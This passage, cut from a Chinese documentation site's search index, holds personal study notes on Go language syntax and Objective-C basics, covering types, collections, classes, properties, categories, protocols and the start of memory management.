删除路径并没有解决删除导致的破坏性质问题，反而是深化了这些被破坏的性质。这是因为删除屏障本质还是在解决插入路径遇到的问题，维持最重要的性质 W-V 的正确性。\nHybrid 屏障：混合屏障 #  "},{"id":268,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/golang/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/","title":"菜鸟教程","section":"Golang","content":"菜鸟教程 #  语言教程 #  计算机软件经历了数十年的发展，形成了多种学术流派，有面向过程编程、面向对象编程、函数式编程、面向消息编程等，这些思想究竟孰优孰劣，众说纷纭。\n除了 OOP 外，近年出现了一些小众的编程哲学，Go 语言对这些思想亦有所吸收。例如，Go 语言接受了函数式编程的一些想法，支持匿名函数与闭包。再如，Go语言接受了以 Erlang 语言为代表的面向消息编程思想，支持 goroutine 和通道，并推荐使用消息而不是共享内存来进行并发编程。总体来说，Go 语言是一个非常现代化的语言，精小但非常强大。\nGo 语言最主要的特性：\n 自动垃圾回收 更丰富的内置类型 函数多返回值 错误处理 匿名函数和闭包 类型和接口 并发编程 反射 语言交互性  语法基础 #   仅仅列举一些值得注意的语法。\n 数据类型 #  使用 fmt.Sprintf 格式化字符串并赋值给新串：\nfmt.Sprintf(\u0026#34;Code=%d\u0026amp;endDate=%s\u0026#34;, 123, \u0026#34;2020-12-31\u0026#34;); Go 中按类别大约有以下几种数据类型：\n ”布尔型“、“数字型”、“字符串型”、“派生类型”； 其中“派生类型”有以下几种：指针类型、数组类型、struct 类型、channel 类型、函数类型、切片类型、interface 类型、Map 类型；  变量 #  变量声明有以下几种方式：\n// 一次声明多个变量 var identifier type // 根据值自行判定变量类型。 var v_name = value // 省略 var，使用 := 定义。左侧如果没有声明新的变量，就产生编译错误 v_name := value 声明多变量的方式：\nvar vname1, vname2, vname3 type var ( vname1 v_type1 vname2 v_type2 ) var vname1, vname2, vname3 = v1, v2, v3 vname1, vname2, vname3 := v1, v2, v3 指定变量类型，如果没有初始化，则变量默认为零值：\n false、0、\u0026quot;\u0026quot;、nil；  值类型、引用类型与 C++ 类似。\n常量 #  常量定义关键词是 const，与变量类似，它的定义格式如下：\nconst identifier [type] = value 在 golang 常量中有一个特殊的语法 iota，下面是使用实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { const ( a = iota //0  b //1  c //2  d = \u0026#34;ha\u0026#34; //独立值，iota += 1  e //\u0026#34;ha\u0026#34; iota += 1  f = 100 //iota +=1  g //100 iota +=1  h = iota //7,恢复计数  i //8  ) fmt.Println(a,b,c,d,e,f,g,h,i) } 条件语句 #  if 条件语句：\n/* 使用 if 语句判断布尔表达式 */ if a \u0026lt; 20 { /* 如果条件为 true 则执行以下语句 */ fmt.Printf(\u0026#34;a 小于 20\\n\u0026#34; ) } switch 条件语句（默认 break，使用 fallthrough 语句执行下一个 case）：\nfunc main() { var x interface{} switch i := x.(type) { case nil: fmt.Printf(\u0026#34; x 的类型 :%T\u0026#34;,i) case int: fmt.Printf(\u0026#34;x 是 int 型\u0026#34;) case float64: fmt.Printf(\u0026#34;x 是 float64 型\u0026#34;) case func(int) float64: fmt.Printf(\u0026#34;x 是 func(int) 型\u0026#34;) case bool, string: fmt.Printf(\u0026#34;x 是 bool 或 string 型\u0026#34; ) default: fmt.Printf(\u0026#34;未知型\u0026#34;) } } select 语句来自于 Linux 中的 select 这一 IO 模式（现在常用的是 epoll），它是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。\nselect 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。\n基本格式：\nselect { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s); } 循环 #  go 中只使用 for 这一个关键字进行循环，但是却可以执行 C 中所有关键字的功能：\nfor init; condition; post { } for condition { } for { } for key, value := range oldMap { newMap[key] = value } 其中 range 循环可以对字符串、数组、切片等进行迭代输出元素，下面举个例子：\npackage main import \u0026#34;fmt\u0026#34; func main() { strings := []string{\u0026#34;google\u0026#34;, \u0026#34;runoob\u0026#34;} for i, s := range strings { fmt.Println(i, s) } numbers := [6]int{1, 2, 3, 5} for i,x:= range numbers { fmt.Printf(\u0026#34;第 %d 位 x 的值 = %d\\n\u0026#34;, i,x) } } 在循环语句中可以使用 break/continue/goto 进行控制。\n函数 #  Go 语言函数定义格式如下：\nfunc function_name( [parameter list] ) [return_types] { // ...函数体 } Go 语言的函数可以返回多个值：\npackage main import \u0026#34;fmt\u0026#34; func swap(x, y string) (string, string) { return y, x } func main() { a, b := swap(\u0026#34;Google\u0026#34;, \u0026#34;Runoob\u0026#34;) fmt.Println(a, b) } Go 语言可以定义引用传值：\nfunc swap(x *int, y *int) { var temp int temp = *x /* 保持 x 地址上的值 */ *x = *y /* 将 y 值赋给 x */ *y = temp /* 将 temp 值赋给 y */ } 数据类型 #  数组 #  声明数组语法：\nvar variable_name [SIZE] variable_type var variable_name [SIZE1][SIZE2]...[SIZEN] variable_type // 多维数组 初始化数组的方式：\nvar balance = [5]float32{1000.0, 2.0, 3.4, 7.0, 50.0} var balance = [...]float32{1000.0, 2.0, 3.4, 7.0, 50.0} // 自动推断数组长度  a := [3][4]int{ {0, 1, 2, 3} , /* 第一行索引为 0 */ {4, 5, 6, 7} , /* 第二行索引为 1 */ {8, 9, 10, 11}, /* 第三行索引为 2 */ } 指针 #  声明指针的语法：\nvar var_name *var-type 空指针的值为 nil。\n定义指针数组（存储着指针的数组）通过以下的方式：\nvar ptr [MAX]*int; 结构 #  与 C 语言中类似，声明的语法：\ntype struct_variable_type struct { member definition member definition ... member definition } 切片 #  对数组的抽象，因为数组的长度是固定的，使用范围有限，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。\n定义切片：\nvar identifier []type var slice1 []type = make([]type, len, capacity) // capacity 是可选参数 范围 #  集合 #  Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。Map 的底层是通过哈希表实现的。\n可以使用内建函数 make 也可以使用 map 关键字来定义 Map：\n/* 声明变量，默认 map 是 nil */ var map_variable map[key_data_type]value_data_type /* 使用 make 函数 */ map_variable := make(map[key_data_type]value_data_type) 接口 #  Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。\n例子：\n/* 定义接口 */ type interface_name interface { method_name1 [return_type] method_name2 [return_type] method_name3 [return_type] ... method_namen [return_type] } /* 定义结构体 */ type struct_name struct { /* variables */ } /* 实现接口方法 */ func (struct_name_variable struct_name) method_name1() [return_type] { /* 方法实现 */ } ... func (struct_name_variable struct_name) method_namen() [return_type] { /* 方法实现*/ } 并发 #  go 语言的核心优势在于并发的实现，所以 go 在工程意义上是一个更适合做“分布式系统”的后端语言，而不适合做科学计算。\ngoroutine #  我们可以用 go 关键词来开启一个 goroutine：\n goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。 同一个程序中的所有 goroutine 共享同一个地址空间。  语法格式如下：\ngo 函数名( 参数列表 ) channel #  goroutine 是 go 语言中用于声明新的线程的方式，channel 则是 go 中用于进行线程间通信的方式。\n 关键字 channel： 可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。 声明 make：声明一个变量使用 make 函数。比如 make(chan int) 声明了一个，可以用于传递 int 类型数据的管道。 操作符 \u0026lt;-： 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。 遍历通道，使用关键字 range：像遍历切片一样的 for 循环； 关闭管道，使用函数 close：如果有某个 goroutine 正在进行 range 遍历，它只有在管道关闭时才会结束，否则会一直阻塞。  下面是一个声明并且使用的例子：\nch := make(chan int) // 指定第二个参数可以指定缓冲区大小  ch \u0026lt;- v // 把 v 发送到通道 ch v := \u0026lt;-ch // 从 ch 接收数据，并把值赋给 v 上面的 make 函数如果指定了第二个参数则指定了缓冲区大小。如果通道不带缓冲，在通道中有内容时，发送方会阻塞直到接收方从通道中接收了值。\n"},{"id":269,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"1.基本语法","section":"Objective-C\u0026SDK","content":"基本语法 #  基本类型 #  布尔型 #  布尔型主要有两种使用方式：\nBOOL v1 = YES;\t// 常用的布尔型使用方式，两个取值分别是 YES, NO  bool v2 = false;\t// 两个取值分别是 true, false 上面的两种方式不是等价的，前者是通过下面的方式实现的：\n#if (TARGET_OS_IPHONE \u0026amp;\u0026amp; __LP64__) || TARGET_OS_WATCH \t#define OBJC_BOOL_IS_BOOL 1 \ttypedef bool BOOL; #else \t#define OBJC_BOOL_IS_CHAR 1 \ttypedef unsigned char BOOL; #endif 整数型 #  除了 C 中实现的整数和无符号整数，OC 同样也实现了两个整数类型：\nNSInteger v1 = 8; NSUInteger v2 = 9; // 无符号和有符号都是：32 位类型为 int, 64 位类型为 long 同样也可以看看他们的实现方式：\n#if __LP64__ || 0 || NS_BUILD_32_LIKE_64 \ttypedef long NSInteger; typedef unsigned long NSUInteger; #else \ttypedef int NSInteger; typedef unsigned int NSUInteger; #endif 数字封装 #  Objective-C 对数字进行了一个类的封装 NSNumber。\n 在 c/c++ 中，当需要使用数字的时候，我们通常使用简单数据类型，如：int、long、float。 然而，在实际开发过程中，我们经常会遇到需要使用对象的场景。所以 Objective-C 中提供了NSNumber 类用来包装简单数字类型。  它封装了一些比较有用的创建方法，下面是一些例子：\nNSNumber *num1 = [NSNumber numberWithShort:1]; NSNumber *num2 = [NSNumber numberWithInt:2]; NSNumber *num3 = [NSNumber numberWithLong:3]; NSNumber *num4 = [NSNumber numberWithFloat:4]; NSNumber *num5 = [NSNumber numberWithBool:YES]; NSNumber *num6 = [NSNumber numberWithInteger:5]; 重载了 @ 符号进行赋值（语法糖）：\nNSNumber *num1 = @1; NSNumber *num2 = @INT_MAX; NSNumber *num3 = @LONG_MAX; NSNumber *num4 = @4.0f; NSNumber *num5 = @YES; NSNumber *num6 = @NSIntegerMax; int a = 1; NSNumber *num7 = @(a); NSNumber *num8 = @(1 + 2); PostScript：\n NSNumber 这个类不能进行数值运算。  字符串 #  Objective-C 作为同样也是支持 C 中的字符串定义语法（单引号指定单个字符，双引号指定字符串），然而大部分 Objective-C 程序是使用一个字符串类的封装：\nNSString *myString1 = @\u0026#34;Hello World\u0026#34;; NSString *myString2 = [NSString stringWithFormat:@\u0026#34;%d %s\u0026#34;, 1, @\u0026#34;String\u0026#34;]; // convert from a c-style string NSString *fromCString = [NSString stringWithCString:\u0026#34;A C string\u0026#34; encoding:NSASCIIStringEncoding]; 可以看到声名一个字面量的字符串类型要做的事情，只是在字符串之前加上一个 @ 符号。\n枚举类型 #   参考资料：https://www.jianshu.com/p/994dc9f4958d\n 在传统的 c 枚举类型中，使用 typedef 可以使枚举变量的声明更加简单：\ntypedef enum { FlyStateOne, FlyStateTwo, FlyStateThree }state; // 它与下面的这种声明方式是等价的 enum FlyTypeState{ FlyTypeOne, FlyTypeTwo, FlyTypeThree }; FlyState state； typedef enum FlyTypeState state; c++11 标准中对枚举类型标准进行了扩充，可以指明枚举的底层数据类型。比如：\nenum FlyState:NSInteger{ //设置底层数据类型为NSInteger  FlyStateOne, FlyStateTwo, FlyStateThree }; 问题是这种标准并不支持使用上面描述的 typedef 语法。\nObjective-C 最常用的枚举数据类型 NS_ENUM 与 NS_OPTION 为了解决这个问题诞生：\n  NS_ENUM 是一个宏，是对 c++ 中的枚举类型的上层封装。比如下面的一个 NS_ENUM 使用实例：\ntypedef NS_ENUM(NSInteger, UIViewAnimationTransition) { UIViewAnimationTransitionNone, UIViewAnimationTransitionFlipFromLeft, UIViewAnimationTransitionFlipFromRight, UIViewAnimationTransitionCurlUp, UIViewAnimationTransitionCurlDown, }; UIViewAnimationTransition trans = UIViewAnimationTransitionNone; 如果编译器支持新标准枚举则上面的定义，展开之后形成下面的代码：\ntypedef enum UIViewAnimationTransition:NSInteger UIViewAnimationTransition; enum UIViewAnimationTransition: NSInteger{ UIViewAnimationTransitionNone, UIViewAnimationTransitionFlipFromLeft, UIViewAnimationTransitionFlipFromRight, UIViewAnimationTransitionCurlUp, UIViewAnimationTransitionCurlDown, }; 如果编译器不支持这种语法，那么这种声明与最开始列举的 typedef 是一样的。\n  NS_OPTIONS 也是一个枚举类型，它可以用于将特征存储在整数的不同比特位上。比如下面这个：\ntypedef NS_OPTIONS(NSUInteger, UIViewAutoresizing) { UIViewAutoresizingNone = 0, UIViewAutoresizingFlexibleLeftMargin = 1 \u0026lt;\u0026lt; 0, UIViewAutoresizingFlexibleWidth = 1 \u0026lt;\u0026lt; 1, UIViewAutoresizingFlexibleRightMargin = 1 \u0026lt;\u0026lt; 2, UIViewAutoresizingFlexibleTopMargin = 1 \u0026lt;\u0026lt; 3, UIViewAutoresizingFlexibleHeight = 1 \u0026lt;\u0026lt; 4, UIViewAutoresizingFlexibleBottomMargin = 1 \u0026lt;\u0026lt; 5 }; NSUInteger resize = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;   PostScript:\n 在 Objective-C 2.0 中，提供了 for-in 循环遍历枚举类型，称为快速枚举。  其他基本数据类型 #  其他数据类型基本与 c 中的语法一样。比如：\nfloat var3 = 3.0f;//单精度浮点数 double var4 = 4.0;//双精度浮点数 long long var5 = 5;//64位整数 char var6 = \u0026#39;a\u0026#39;;//单个字符 类相关数据类型 #  在引入类的概念的时候，不同于 c++ 的一些特殊的类型：\n instancetype：是 clang 关键字，使方法返回所在类的类型，只能用作方法返回类型。 id：指代任何位置类型的 NSObject 对象，类似于 void*。 nil：表示指向的对象指针为空，类似于 c++ 中的 nullptr。  控制流 #  循环、条件跳转，都与 c 中的相同。\n消息传递 #  Objective-C 里，与其说对象互相调用方法，不如说对象之间互相传递消息更为精确。此二种风格的主要差异在于 调用方法/消息传递 这个动作：\n C++ 里类别与方法的关系严格清楚，一个方法必定属于一个类别，而且在编译时（compile time）就已经紧密绑定，不可能调用一个不存在类别里的方法。 但在Objective-C，类别与消息的关系比较松散，调用方法视为对对象发送消息，所有方法都被视为对消息的回应。所有消息处理直到运行时（runtime）才会动态决定，并交由类别自行决定如何处理收到的消息。也就是说，一个类别不保证一定会回应收到的消息，如果类别收到了一个无法处理的消息，程序只会抛出异常，不会出错或崩溃。  比如 C++ 里，送一个消息给对象（或者说调用一个方法）的语法如下：\nobj.method(argument); Objective-C 中则写成：\n[obj method: argument]; 此二者并不仅仅是语法上的差异，还有基本行为上的不同。\n"},{"id":270,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/10.%E6%95%B0%E7%BB%84%E4%B8%8E%E5%AD%97%E5%85%B8/","title":"10.数组与字典","section":"Objective-C\u0026SDK","content":" 参考：https://github.com/ming1016/study/wiki/iOS基础集合类\n 数组与字典 #  NSArray/NSMutableArray #  基本使用 #  定义、初始化一个 NSArray，可以用以下的方式：\n// NSArray: @[] NSArray *instructors = @[ @\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34; ]; // NSArray: arrayWithObjects/initWithObjects NSArray *instructors = [NSArray arrayWithObjects:@\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34;, nil]; NSArray *instructors = [[NSArray alloc] initWithObjects:@\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34;, nil]; 定义、初始化一个 NSMutableArray，可以用以下的方式：\n// NSMutableArray: copy from NSArray NSArray *instructors = @[ @\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34; ]; NSMutableArray *mInstructors = [instructors mutableCopy]; // NSMutableArray: array with array NSMutableArray *mInstructors = [NSMutableArray arrayWithArray:@[ @\u0026#34;Joe\u0026#34;, @\u0026#34;Tim\u0026#34;, @\u0026#34;Jim\u0026#34;, @\u0026#34;Tom\u0026#34;, @\u0026#34;Mark\u0026#34; ] ]; // NSMutableArray: 下面三种初始化空Array的方式是等价的，建议的方法是第一种 NSMutableArray *mEmpty = [[NSMutableArray alloc] init]; NSMutableArray *mEmpty = [NSMutableArray new]; NSMutableArray *mEmpty = [NSMutableArray array]; 另外还有常用的函数 removeObject: / removeObject:atIndex: / insertObject: / insertObject:atIndex: / replaceObjectAtIndex:withObject: 等，不举例了。\n排序 #  存储内容是字符串，可以用 @selector(localizedCaseInsensitiveCompare:) 排序：\nNSArray *array = @[@\u0026#34;John Appleseed\u0026#34;, @\u0026#34;Tim Cook\u0026#34;, @\u0026#34;Hair Force One\u0026#34;, @\u0026#34;Michael Jurewitz\u0026#34;]; NSArray *sortedArray = [array sortedArrayUsingSelector:@selector(localizedCaseInsensitiveCompare:)]; 若存储内容为数字，可以用 @selector(compare:) 排序：\nNSArray *numbers = @[@9, @5, @11, @3, @1]; NSArray *sortedNumbers = [numbers sortedArrayUsingSelector:@selector(compare:)]; 除了 sortedArrayUsingSelector: 函数之外，另外还有其他排序函数：\n// 函数指针 sortedArrayHint 的排序方式 - (NSData *)sortedArrayHint; - (NSArray *)sortedArrayUsingFunction:(NSInteger (*)(id, id, void *))comparator context:(void *)context; - (NSArray *)sortedArrayUsingFunction:(NSInteger (*)(id, id, void *))comparator context:(void *)context hint:(NSData *)hint; // 基于block的排序方法 - (NSArray *)sortedArrayUsingComparator:(NSComparator)cmptr; - (NSArray *)sortedArrayWithOptions:(NSSortOptions)opts usingComparator:(NSComparator)cmptr; 三种方式的性能比较：selector 性能 \u0026gt; block 性能 \u0026gt; function 性能\n枚举遍历 #  使用 indexesOfObjectsWithOptions:passingTest 过滤：\nNSIndexSet *indexes = [randomArray indexesOfObjectsWithOptions:NSEnumerationConcurrent passingTest:^BOOL(id obj, NSUInteger idx, BOOL *stop) { return testObj(obj); }]; NSArray *filteredArray = [randomArray objectsAtIndexes:indexes]; 传统的枚举遍历方式（本质是使用 NSFastEnumeration）：\nNSMutableArray *mutableArray = [NSMutableArray array]; for (id obj in randomArray) { if (testObj(obj)) { [mutableArray addObject:obj]; } } BLOCK 的遍历方式：\nNSMutableArray *mutableArray = [NSMutableArray array]; [randomArray enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) { if (testObj(obj)) { [mutableArray addObject:obj]; } }]; 通过 [] 下标或 objectAtIndex: 方法遍历：\nNSMutableArray *mutableArray = [NSMutableArray array]; for (NSUInteger idx = 0; idx \u0026lt; randomArray.count; idx++) { id obj = randomArray[idx]; if (testObj(obj)) { [mutableArray addObject:obj]; } } 使用比较传统的学院派 NSEnumerator 迭代器遍历：\nNSMutableArray *mutableArray = [NSMutableArray array]; NSEnumerator *enumerator = [randomArray objectEnumerator]; id obj = nil; while ((obj = [enumerator nextObject]) != nil) { if (testObj(obj)) { [mutableArray addObject:obj]; } } 使用 predicate：\nNSArray *filteredArray2 = [randomArray filteredArrayUsingPredicate:[NSPredicate predicateWithBlock:^BOOL(id obj, NSDictionary *bindings) { return testObj(obj); }]]; 上面的七种方法性能由高到低递减：\n indexesOfObjectsWithOptions:NSEnumerationConcurrent \u0026gt; NSFastEnumeration \u0026gt; enumerateObjectsUsingBlock: \u0026gt; objectAtIndex: \u0026gt; NSEnumerator \u0026gt; filteredArrayUsingPredicate:  NSDictionary / NSMutableDictionary #  "},{"id":271,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/11.runloop/","title":"11. Run Loop","section":"Objective-C\u0026SDK","content":" 参考：\n https://stackoverflow.com/questions/7222449/nsdefaultrunloopmode-vs-nsrunloopcommonmodes https://hit-alibaba.github.io/interview/iOS/ObjC-Basic/Runloop.html https://blog.ibireme.com/2015/05/18/runloop/  官方文档：\n https://developer.apple.com/documentation/foundation/nsrunloop?language=objc   "},{"id":272,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/2.%E7%B1%BB/","title":"2.类","section":"Objective-C\u0026SDK","content":"类 #  概述 #  Objective-C 主要有以下三种文件类型：\n   扩展名 内容类型     .h 头文件。头文件包含类，类型，函数和常数的声明。   .m 源代码文件。这是典型的源代码文件扩展名，可以包含 Objective-C 和 C 代码。   .mm 源代码文件。带有这种扩展名的源代码文件，还可以包含 C++ 代码。\n仅在你的 Objective-C 代码中确实需要使用 C++ 类或者特性的时候才用这种扩展名。    新建类文件，在 xcode 中使用快捷键 command + N。可见它创建了一下的两个文件：\n// Person.h #import \u0026lt;Foundation/Foundation.h\u0026gt;  NS_ASSUME_NONNULL_BEGIN @interface Person : NSObject @end NS_ASSUME_NONNULL_END // Person.m #import \u0026#34;Person.h\u0026#34;  @implementation Person @end 下面由这两个文件，展开介绍一下 OC 的内容：\n  Objective-C 的类规格说明包含了两个部分：定义（interface）与实现（implementation）。\n 定义（interface）部分包含了类声明和实例变量的定义，以及类相关的方法。 实现（implementation）部分包含了类方法的实际代码。    NSObject：NSObject 是大部分 OC 类继承体系的根类。\n这个类提供了一些通用的方法，比如对象的创建与初始化方法。对象通过继承 NSObject，可以从其中继承访问运行时的接口，并让对象具备 OC 对象的基本能力：\n@interface NSObject \u0026lt;NSObject\u0026gt; //instancetype：返回结果以方法所在的类为类型 - (instancetype)init;\t//初始化对象 + (instancetype)alloc;\t//类方法，创建与分配内存空间 + (instancetype)new;\t//等价于 alloc + init  @end   如何创建并初始化一个对象：\nNSObject *obj = [[NSObject alloc] init]; Person *person = [[Person alloc] init];\t// 这类似于 Person.alloc().init()   成员变量 #  成员定义 #  成员定义的位置是在类定义最开始的一个花括号中：\n@interface ClassName : ItsSuperclass { // Instance variable declarations. } // Method and property declarations. @end 比如下面的一个例子：\n@interface Person : NSObject { NSString *_name;\t// NSString 是 OC 中的字符串  NSInteger _age;\t// NSInteger 是 OC 中的整型 } @end 变量作用域 #  与 c++ 中类似，成员变量也有访问控制机制，除了 @public、@protected、@public 三种访问控制之外，还有第四种 @package：\n 被声明为 @package 的变量，在实现这个类的可执行镜像中表现为 @public（可以直接访问），对外则表现为 @private（不可以访问）； 它类似于对 c++ 中的 private 关键字的扩展，如果外部尝试访问被声明为 @package 的变量，则会导致编译器的连接错误；  成员方法 #  定义方法 #  我们下面列举一个方法的定义来介绍一个方法定义的完整结构：\n@interface Person : NSObject {NSString *_name; NSInteger _age;} - (instancetype)initWithName:(NSString *)name andAge:(NSInteger)age; + (instancetype)personWithName:(NSString *)name andAge:(NSInteger)age; @end  第一个部分是 +/-：  加号（+）代表类方法（class method），不需要实例就可以调用，与C++ 的静态函数相似； 减号（-）即是一般的实例方法（instance method）；   第二个部分是 (instancetype) 指明方法的返回值类型； Objective-C 的函数名可以分开写，也就是说上面定义的函数名实际为 initWithNameandAge；（这个语法简直太鬼畜了） 函数的参数则是冒号后定义的参数类型和参数名，上面定义的是 name 与 age；  实现方法 #  下面是一个上面方法的实现：\n- (instancetype)initWithName:(NSString *)name andAge:(NSInteger)age { self = [super init]; if (self) { _name = name; _age = age; } return self; }  super 关键词是一个编译器符号，用于调用父类方法； self 代指对象本身；  下面是第二个方法的实现：\n+ (instancetype)personWithName:(NSString *)name andAge:(NSInteger)age { Person *person = [[Person alloc] initWithName:name andAge:age]; return person; } 调用方法 #  其实在第二个方法实现的过程中已经用到了相关方法 的调用。\n因为第二个方法是静态方法，我们也可以直接通过下面的方式对方法进行调用：\nPerson *person1 = [[Person alloc] initWithName:@\u0026#34;小明\u0026#34; andAge:18]; 其他补充 #  如何在方法外访问类的成员？\n 同 c++/java 一样，只能通过定义 Setter 与 Getter 方法。 为了避免大量的冗余代码，我们引入了属性的概念。  属性 Property #  定义属性 #  什么是属性？\n 如果你定义个名为 member 的属性，编译器会自动生成名为 _member 的成员变量； 编译器会自动为声明为属性的成员变量添加 Setter 与 Getter 方法。比如 member 这个属性的如果被定义，则会生成 setterMember 与 getterMember 这两个方法。  定义一个属性，主要通过下面的语法实现：\n@property (attribute1 [, attribute2, ...]) type name; 比如我们可以将之前 Person 的两个成员变量定义为属性：\n@interface Person : NSObject @property (nonatomic, strong) NSString *name; @property (nonatomic, assign) NSInteger age; @end 属性修饰符 #  把上面的语法中，括号内的部分称作属性的修饰符（我不知道应该怎么翻译了），那么它有以下这些选项可以选择：\n 可写性控制：设置这个属性主要用于控制编译器是否自动生成 Setter 方法。它有两个可选值 readwrite 与 readonly，前者是默认值； Setter 语法控制：与 iOS 的内存管理机制有关，详见 ARC 内存管理机制； 原子性控制：atomic 与 nonatomic 两种取值，前者是默认值。如果设置为前者，在多线程操作的时候都会取到一个原子性操作之后的值。  使用属性 #  比如我们需要访问或设置一个对象的属性值，可以使用传统的 c++ 点语法：\nPerson *person = [[Person alloc] init]; person.name = @\u0026#34;小明\u0026#34;;\t//点语法设置 NSString *name = person.name;\t//点语法访问 也可以使用 Setter 函数与 Getter 函数：\n[person setAge:18];\t//Setter 方法设置 NSInteger age = [person age];\t//Getter 方法访问 类别 Category #  什么是类别？\n Objective-C 可以为现有的类添加新的方法，并不需要通过继承的方式实现，也不需要访问原生代码，这种动态特征称为类别。 通过类别可以动态的为现有类添加新的方法，并且可以将类定义模块化地分布到多个相关文件中。  在 Xcode 添加 Objective-C File，并将类型设置为 Category、其指定的类设置为 Person、将其名称命名为 Read。xcode 会自动生成以下 Person+Read.h 与 Person+Read.m 两个文件：\n// Person+Read.h #import \u0026#34;Person.h\u0026#34;  NS_ASSUME_NONNULL_BEGIN @interface Person (Read) @end NS_ASSUME_NONNULL_END // Person+Read.m #import \u0026#34;Person+Read.h\u0026#34;  @implementation Person (Read) @end PostScript：\n 类别方法会影响所有子类； 可以为一个类定义多个类别； 类别方法会覆盖原有的类方法； 多个类别重名方法结果不确定（避免重名）。  扩展 Extension #  扩展与类别同样是为了解决代码的可扩展性问题，它与类别的主要区别是：\n  扩展仅能在原始类的 .m 文件中实现；\n  扩展可以添加新的属性，类别 “不行”；\n  类别是运行时特性，扩展属于编译器特性。\n  实际上就是在 .m 文件中进行额外的声明，它与 .h 文件中进行声明的区别是，外部只能引用头文件中定义的属性、成员、方法等。\n协议 Protocol #  定义协议 #  什么是协议？\n 定义公共接口的地方，只要类申明遵守了一个协议，就等于在头文件中定义了协议里的方法。 协议可以将不同类的共同行为抽象出来，类似于 Java 里的接口，但更加强大。  在 Xcode 中，与创建类别一样的步骤，将文件类型设置为 Protocol 即可。与之前的几种都不同，xcode 只会自动生成一个 .h 头文件，如下：\n#import \u0026lt;Foundation/Foundation.h\u0026gt;  NS_ASSUME_NONNULL_BEGIN @protocol PrintProtocol \u0026lt;NSObject\u0026gt; @end NS_ASSUME_NONNULL_END 下面是一个协议实现的例子，我们通过这个例子解释一下协议定义语法的各个部分：\n@protocol PrintProtocol \u0026lt;NSObject\u0026gt; @optional @property (nonatomic, strong) NSString *name; @required - (void)printName; @end  声明一个协议的关键词是 @protocol 与 @end；跟在前者后面的 PrintProtocol 是协议名称； 尖括号语法 \u0026lt;NSObject\u0026gt; 是父协议，支持多继承，逗号分隔； @optional 与 @requireed 是成员的修饰符，分别指明实现这个协议的模块，可选或者必须地实现相应的成员或属性； 协议中的 property 相当于只能名 Getter, Setter 方法。  实现协议 #  在定义类的时候需要通过尖括号，比如下面的方式指定协议：\n@interface Person : NSObject \u0026lt;PrintProtocol\u0026gt; 此即定义 Person 继承自 NSObject，并实现协议 PrintProtocol。\n同样定义扩展或类别时，也可以通过尖括号指定协议，比如：\n@interface Person (Read) \u0026lt;PrintProtocol\u0026gt; 另外需要在 .m 文件中实现对应的方法：\n- (void)printName { NSLog(@\u0026#34;%@\u0026#34;, self.name); } 也可以用泛型表示一个满足协议的类：id\u0026lt;TargetProtocol\u0026gt;\n选择器 Selector #   参考官方文档\n 在 Objetive-C 中，选择器 selector 有两个含义：\n 在源代码中，它可以代指一个对象的成员方法； 另外，在源代码已经编译完成的二进制文件中，它是一个唯一标识符。考虑到执行效率，编译器会抛弃源代码中用人类可读的 ASCII 表示的标识符，生成一个唯一标识写入表格中，它们类型为 SEL.；  也就是说，什么是 @selector：\n 选择器就是在 Objective-C 语言中，对方法进行唯一标示的标识符；  基本常用类 #   NSNumber NSString、NSMutableString NSArray、NSMutableArray NSDictionary、NSMutableDictionary NSData、NSMutableData  "},{"id":273,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/objective-csdk/3.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","title":"3.内存管理","section":"Objective-C\u0026SDK","content":"内存管理 #  概述 #  三种主要的内存管理方式：\n 显示内存释放：C 中的 free、C++ 中的 delete； 基于引用计数：C++ 中的智能指针（smart pointer），Objective-C 中使用的方式； 垃圾回收机制：Java、JavaScript、C#；  OS X (macOS) 过去支持垃圾回收，现在已经废除了。iOS 则一直不支持垃圾回收。\n引用计数 #  iOS 支持 MRC (Mannul Reference Counting) 手动引用计数与 ARC (Automatic Reference Counting) 自动引用计数两种管理机制。\nMRC #  手动引用计数主要有以下的几个相关的操作：\n 生成（分配一个对象，并且引用计数置为 1）：alloc、cpoy、new； 持有（将一个对象的引用计数自增 1）：retain； 释放（将一个对象的引用计数自减 1）：release、autorelease； 废弃（释放一个对象，引用计数降为 0 应该废弃）：dealloc； 